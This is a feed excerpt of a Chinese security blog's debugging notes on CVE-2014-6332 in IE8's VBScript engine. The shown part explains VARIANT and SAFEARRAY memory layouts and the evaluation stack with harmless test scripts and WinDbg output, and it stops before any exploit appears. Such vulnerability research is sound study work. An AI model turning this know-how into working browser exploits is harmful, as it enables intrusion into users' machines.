<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazymind</title>
  
  <subtitle>Coding For Fun</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lazymind.me/"/>
  <updated>2019-07-18T09:51:12.608Z</updated>
  <id>https://lazymind.me/</id>
  
  <author>
    <name>Conan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2014-6332 调试笔记</title>
    <link href="https://lazymind.me/2019/06/cve-2014-6332/"/>
    <id>https://lazymind.me/2019/06/cve-2014-6332/</id>
    <published>2019-06-26T21:00:00.000Z</published>
    <updated>2019-07-18T09:51:12.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>操作系统: Windows 7 Service Pack 1 32 位</p><p>浏览器: IE 8.0.7601.17514</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="1-vbscript-基础语法"><a href="#1-vbscript-基础语法" class="headerlink" title="1. vbscript 基础语法"></a>1. vbscript 基础语法</h3><p>vbscript 中定义一维数组语法 <code>dim array(9)</code> ,表示定义了一个包含10个元素的数组，下标从0开始，和其它语言唯一的区别是元素个数是 n + 1个。</p><p>多维数组： <code>dim array(2, 3)</code>, 表示定义了一个3行4列的二维数组。也可以不指明元素个数： <code>dim array()</code>。</p><p>使用关键字 <code>redim</code> 可以修改已定义的数组大小：<code>redim array(4)</code> 。但是在改变数组大小时，数组的数据可能会被破坏，需要加上关键字 <code>preserve</code>： <code>redim preserve array(10)</code>。此时原数组的数据不会破坏。</p><h3 id="2-常用调试辅助函数"><a href="#2-常用调试辅助函数" class="headerlink" title="2. 常用调试辅助函数"></a>2. 常用调试辅助函数</h3><p>在调试vbscript脚本时，一般会使用一些辅助函数用于方便调试定位变量地址，先来看下<code>IsEmpty</code>函数，该函数对应<code>vbscript.dll</code>模块中的<code>VbsIsEmpty</code>函数：</p><p><img src="/media/cve-2014-6332/VbsIsEmpty.png" alt="VbsIsEmpty"></p><p>在<code>VbsIsEmpty</code>函数中，实际调用的是<code>GetVarType</code>对第三个参数的进行类型判别，而第三个参数对应的即是 vbscript 语句中 <code>IsEmpty</code> 对应的参数。这样便可在调试时很容易知道我们需要的变量所在的内存地址。在 vbscript调试中会经常用到这个函数断点，同样的还有<code>VbsIsObject</code>,<code>VbsIsNull</code>等。</p><p>常见vbscript语句与对应的实现函数关系:</p><table><thead><tr><th align="center">vbscript 语句</th><th align="center">Native 实现函数</th></tr></thead><tbody><tr><td align="center"><code>redim array(10)</code></td><td align="center"><code>vbscript!MakeArray</code></td></tr><tr><td align="center"><code>redim preserve array(10)</code></td><td align="center"><code>vbscript!RedimPreserveArray</code></td></tr><tr><td align="center"><code>a = 1</code></td><td align="center"><code>vbscript!AssignVar</code></td></tr><tr><td align="center"><code>IsEmpty</code></td><td align="center"><code>vbscript!VbsIsEmpty</code></td></tr><tr><td align="center"><code>Msgbox &quot;hello&quot;</code></td><td align="center"><code>vbscript!VbsMsgbox</code></td></tr><tr><td align="center"><code>IsObject(a)</code></td><td align="center"><code>vbscript!VbsIsObject</code></td></tr></tbody></table><h3 id="3-vbscript-变量"><a href="#3-vbscript-变量" class="headerlink" title="3. vbscript 变量"></a>3. vbscript 变量</h3><p>vbscript中变量由<a href="https://docs.microsoft.com/zh-cn/windows/desktop/api/oaidl/ns-oaidl-tagvariant" target="_blank" rel="noopener"><code>VARIANT</code></a>结构体定义，内存占用大小为<code>0x10</code>，其结构如下(简化了union部分):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagVARIANT</span> &#123;</span></span><br><span class="line">    VARTYPE varType;       +<span class="number">0x0</span>: word 变量的类型值</span><br><span class="line">    WORD    wReserved1;</span><br><span class="line">    WORD    wReserved2;</span><br><span class="line">    WORD    wReserved3;</span><br><span class="line">    DWORD   dataLow;       +<span class="number">0x8</span>: dword 存放实际的元素数据</span><br><span class="line">    DWORD   dataHigh;      +<span class="number">0xc</span>: dword 同上，对于哪些字节表示实际数据，需要参考varType的值，以确定数据的大小</span><br><span class="line">&#125; VARIANT;</span><br></pre></td></tr></table></figure><p>其中<code>varType</code>字段表示变量的类型，由 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wtypes/ne-wtypes-varenum" target="_blank" rel="noopener"><code>VARENUM</code></a> 枚举类型指定，对应的头文件为<code>wtypes.h</code>,常见的类型值如下:</p><p>常用版:</p><table><thead><tr><th align="center">Constant</th><th align="center">Value</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">vbEmpty</td><td align="center">0</td><td align="center">未初始化（Empty）</td></tr><tr><td align="center">vbNull</td><td align="center">1</td><td align="center">无效数据（NULL）</td></tr><tr><td align="center">vbInterger</td><td align="center">2</td><td align="center">整型（Interger）</td></tr><tr><td align="center">vbLong</td><td align="center">3</td><td align="center">长整型（Long Interger）</td></tr><tr><td align="center">vbDouble</td><td align="center">5</td><td align="center">双精度类型</td></tr><tr><td align="center">vbString</td><td align="center">8</td><td align="center">字符串类型</td></tr><tr><td align="center">VbClass</td><td align="center">9</td><td align="center">类对象引用</td></tr><tr><td align="center">vbVariant</td><td align="center">0xc</td><td align="center">Variant（仅对数组有效）</td></tr><tr><td align="center">vbArray</td><td align="center">0x2000</td><td align="center">数组类型</td></tr></tbody></table><p>官方版:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> VARENUM &#123;</span><br><span class="line">    VT_EMPTY            = <span class="number">0</span>,</span><br><span class="line">    VT_NULL             = <span class="number">1</span>,</span><br><span class="line">    VT_I2               = <span class="number">2</span>,</span><br><span class="line">    VT_I4               = <span class="number">3</span>,</span><br><span class="line">    VT_R4               = <span class="number">4</span>,</span><br><span class="line">    VT_R8               = <span class="number">5</span>,</span><br><span class="line">    VT_CY               = <span class="number">6</span>,</span><br><span class="line">    VT_DATE             = <span class="number">7</span>,</span><br><span class="line">    VT_BSTR             = <span class="number">8</span>,</span><br><span class="line">    VT_DISPATCH         = <span class="number">9</span>,</span><br><span class="line">    VT_ERROR            = <span class="number">0x0A</span>,</span><br><span class="line">    VT_BOOL             = <span class="number">0x0B</span>,</span><br><span class="line">    VT_VARIANT          = <span class="number">0x0C</span>,</span><br><span class="line">    VT_UNKNOWN          = <span class="number">0x0D</span>,</span><br><span class="line">    VT_DECIMAL          = <span class="number">14</span>,</span><br><span class="line">    VT_I1               = <span class="number">16</span>,</span><br><span class="line">    VT_UI1              = <span class="number">17</span>,</span><br><span class="line">    VT_UI2              = <span class="number">18</span>,</span><br><span class="line">    VT_UI4              = <span class="number">19</span>,</span><br><span class="line">    VT_I8               = <span class="number">20</span>,</span><br><span class="line">    VT_UI8              = <span class="number">21</span>,</span><br><span class="line">    VT_INT              = <span class="number">22</span>,</span><br><span class="line">    VT_UINT             = <span class="number">23</span>,</span><br><span class="line">    VT_VOID             = <span class="number">24</span>,</span><br><span class="line">    VT_HRESULT          = <span class="number">25</span>,</span><br><span class="line">    VT_PTR              = <span class="number">26</span>,</span><br><span class="line">    VT_SAFEARRAY        = <span class="number">27</span>,</span><br><span class="line">    VT_CARRAY           = <span class="number">28</span>,</span><br><span class="line">    VT_USERDEFINED      = <span class="number">29</span>,</span><br><span class="line">    VT_LPSTR            = <span class="number">30</span>,</span><br><span class="line">    VT_LPWSTR           = <span class="number">31</span>,</span><br><span class="line">    VT_RECORD           = <span class="number">36</span>,</span><br><span class="line">    VT_INT_PTR          = <span class="number">37</span>,</span><br><span class="line">    VT_UINT_PTR         = <span class="number">38</span>,</span><br><span class="line">    VT_FILETIME         = <span class="number">64</span>,</span><br><span class="line">    VT_BLOB             = <span class="number">65</span>,</span><br><span class="line">    VT_STREAM           = <span class="number">66</span>,</span><br><span class="line">    VT_STORAGE          = <span class="number">67</span>,</span><br><span class="line">    VT_STREAMED_OBJECT  = <span class="number">68</span>,</span><br><span class="line">    VT_STORED_OBJECT    = <span class="number">69</span>,</span><br><span class="line">    VT_BLOB_OBJECT      = <span class="number">70</span>,</span><br><span class="line">    VT_CF               = <span class="number">0x47</span>,</span><br><span class="line">    VT_CLSID            = <span class="number">0x48</span>,</span><br><span class="line">    VT_VERSIONED_STREAM = <span class="number">0x49</span>,</span><br><span class="line">    VT_BSTR_BLOB        = <span class="number">0xFFF</span>,</span><br><span class="line">    VT_VECTOR           = <span class="number">0x1000</span>,</span><br><span class="line">    VT_ARRAY            = <span class="number">0x2000</span>,</span><br><span class="line">    VT_BYREF            = <span class="number">0x4000</span>,</span><br><span class="line">    VT_RESERVED         = <span class="number">0x8000</span>,</span><br><span class="line">    VT_ILLEGAL          = <span class="number">0xFFFF</span>,</span><br><span class="line">    VT_ILLEGALMASKED    = <span class="number">0xFFF</span>,</span><br><span class="line">    VT_TYPEMASK         = <span class="number">0xFFF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试如下poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    dim a</span><br><span class="line">    dim b</span><br><span class="line">    dim c</span><br><span class="line">    dim d</span><br><span class="line">    a = &amp;h1234</span><br><span class="line">    b = &amp;h87654321</span><br><span class="line">    c = 1.1234567890123456789</span><br><span class="line">    d = "hello"</span><br><span class="line">    IsEmpty(a)</span><br><span class="line">    IsEmpty(b)</span><br><span class="line">    IsEmpty(c)</span><br><span class="line">    IsEmpty(d)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:38:39.588 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  00000002 00000000 00001234 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:45:11.523 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  00000003 00000000 87654321 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:45:33.488 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  00000005 00000000 d3746f66 3ff1f9ad</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 18:45:48.838 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=021dd414 ecx=6a32a9d8 edx=021dd38c esi=0230a43c edi=00000001</span><br><span class="line">eip=6a2ec206 esp=021dd2a8 ebp=021dd2b8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0230acd0  0000004a 00000000 0060f838 00000000</span><br><span class="line">0:005&gt; dd 0060f838 l4</span><br><span class="line">0060f838  00000008 00000000 003ceb74 00000000</span><br><span class="line">0:005&gt; du 003ceb74</span><br><span class="line">003ceb74  &quot;hello&quot;</span><br><span class="line">0:005&gt; dt VARIANT 0060f838 vt wReserved1 wReserved2 wReserved3 bstrVal</span><br><span class="line">ole32!VARIANT</span><br><span class="line">   +0x000 vt         : 8</span><br><span class="line">   +0x002 wReserved1 : 0</span><br><span class="line">   +0x004 wReserved2 : 0</span><br><span class="line">   +0x006 wReserved3 : 0</span><br><span class="line">   +0x008 bstrVal    : 0x003ceb74  &quot;hello&quot;</span><br><span class="line">0:005&gt; dd 0x003ceb74 - 4 l4</span><br><span class="line">003ceb70  0000000a 00650068 006c006c 0000006f</span><br></pre></td></tr></table></figure><p>在字符串类型中，<code>VT_BSTR</code>指针的前4个字节实际上存的是字符串的长度(一个字符两个字节)。</p><h3 id="4-vbscript-数组"><a href="#4-vbscript-数组" class="headerlink" title="4. vbscript 数组"></a>4. vbscript 数组</h3><p>vbscript中数组由<code>SAFEARRAY</code>和<code>SAFEARRAYBOUND</code>结构体定义.</p><p><a href="https://docs.microsoft.com/en-us/windows/desktop/api/oaidl/ns-oaidl-safearray" target="_blank" rel="noopener"><code>SAFEARRAY</code></a>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSAFEARRAY</span> &#123;</span></span><br><span class="line">  USHORT         cDims;<span class="comment">// 数组维数</span></span><br><span class="line">  USHORT         fFeatures;<span class="comment">// 数组特性</span></span><br><span class="line">  ULONG          cbElements;<span class="comment">// 每个元素大小</span></span><br><span class="line">  ULONG          cLocks;<span class="comment">// 锁定计数</span></span><br><span class="line">  PVOID          pvData;<span class="comment">// 实际数组数据指针</span></span><br><span class="line">  SAFEARRAYBOUND rgsabound[<span class="number">1</span>];   <span class="comment">// 数组下标相关信息</span></span><br><span class="line">&#125; SAFEARRAY;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/desktop/api/oaidl/ns-oaidl-safearraybound" target="_blank" rel="noopener"><code>SAFEARRAYBOUND</code></a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSAFEARRAYBOUND</span> &#123;</span></span><br><span class="line">  ULONG cElements;<span class="comment">// 该维数数组大小，即元素个数</span></span><br><span class="line">  LONG  lLbound;<span class="comment">// 该维数数组索引的起始值</span></span><br><span class="line">&#125; SAFEARRAYBOUND, *LPSAFEARRAYBOUND;</span><br></pre></td></tr></table></figure><p>调试如下poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    dim a(2)</span><br><span class="line">    a(0) = &amp;h12345678</span><br><span class="line">    a(1) = &amp;h87654321</span><br><span class="line">    IsEmpty(a)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 19:18:30.865 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=68d8185c ebx=0241cfac ecx=68dda9d8 edx=0241cf24 esi=02079e44 edi=00000001</span><br><span class="line">eip=68d9c206 esp=0241ce40 ebp=0241ce50 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">68d9c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0207a5e0  0000600c 00000000 0070fd08 004f9e50</span><br><span class="line">0:005&gt; dd 004f9e50 l8</span><br><span class="line">004f9e50  08920001 00000010 00000000 004d3c38</span><br><span class="line">004f9e60  00000003 00000000 43797355 8c000000</span><br><span class="line">0:005&gt; dt SAFEARRAY 004f9e50</span><br><span class="line">ole32!SAFEARRAY</span><br><span class="line">   +0x000 cDims            : 1</span><br><span class="line">   +0x002 fFeatures        : 0x892</span><br><span class="line">   +0x004 cbElements       : 0x10</span><br><span class="line">   +0x008 cLocks           : 0</span><br><span class="line">   +0x00c pvData           : 0x004d3c38</span><br><span class="line">   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND</span><br><span class="line">0:005&gt; dt SAFEARRAYBOUND 004f9e50 + 0x10</span><br><span class="line">ole32!SAFEARRAYBOUND</span><br><span class="line">   +0x000 cElements        : 3</span><br><span class="line">   +0x004 lLbound          : 0</span><br><span class="line">0:005&gt; dd 0x004d3c38 lc</span><br><span class="line">004d3c38  00000003 00000000 12345678 00000000</span><br><span class="line">004d3c48  00000003 00000000 87654321 00000000</span><br><span class="line">004d3c58  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><h3 id="5-vbscript-求值栈"><a href="#5-vbscript-求值栈" class="headerlink" title="5. vbscript 求值栈"></a>5. vbscript 求值栈</h3><p>在vbscript解释器中，像赋值或者求值等操作，都会用到一个栈来保存中间及临时结果，这个栈被称为求值栈，栈上的对象格式为<code>VARIANT</code>类型。如 <code>a=&amp;h12345678</code>,解释器会先将<code>&amp;h12345678</code>解析为<code>VARIANT</code>对象，然后放到求值栈中，然后调用<code>vbscript!AssignVar</code>函数进行复制操作，先取出求值栈中<code>0x12345678</code>的<code>VARIANT</code>对象，然后赋值给<code>a</code>。</p><p>调试如下poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    dim a</span><br><span class="line">    IsEmpty("AssignVar")</span><br><span class="line">    a = &amp;h87654321</span><br><span class="line">    IsEmpty(a)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:012&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:012&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:012&gt; g</span><br><span class="line">Tue Jun 25 21:53:09.006 2019 (GMT+8): ModLoad: 6b650000 6b6bb000   C:\Windows\system32\vbscript.dll</span><br><span class="line">Tue Jun 25 21:53:09.006 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6b65185c ebx=022fd034 ecx=6b6aa9d8 edx=022fcfac esi=01fc9a60 edi=00000001</span><br><span class="line">eip=6b66c206 esp=022fcec8 ebp=022fced8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6b66c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0027fe50  00000008 00000000 01fc9a44 01fc97f4</span><br><span class="line">0:005&gt; du 01fc9a44</span><br><span class="line">01fc9a44  &quot;AssignVar&quot;</span><br><span class="line">0:005&gt; bu vbscript!Assignvar</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 21:56:14.381 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=0027fe60 ebx=022fd034 ecx=022fd034 edx=00000010 esi=01fc9a60 edi=00000010</span><br><span class="line">eip=6b652e64 esp=022fcee0 ebp=022fcfdc iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vbscript!AssignVar:</span><br><span class="line">6b652e64 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0027fe50  00000003 00000000 87654321 01fc97f4</span><br></pre></td></tr></table></figure><p>可以看到，在第一个断点<code>IsEmpty</code>处，求值栈栈顶地址为<code>0x0027fe50</code>,栈上对象类型为<code>0x8</code>,<code>VT_BSTR</code>。当在第二次断点时，栈顶对象类型变成了<code>0x3</code>，为<code>VT_I4</code>类型。对应的值即为poc中的<code>0x87654321</code>。</p><p>在vbscript中，无法获取函数指针的，但是当尝试把函数地址赋值给变量是，求值栈会发生神奇的事情。调试如下poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    On Error Resume Next</span><br><span class="line">    sub func()</span><br><span class="line">    end sub</span><br><span class="line"></span><br><span class="line">    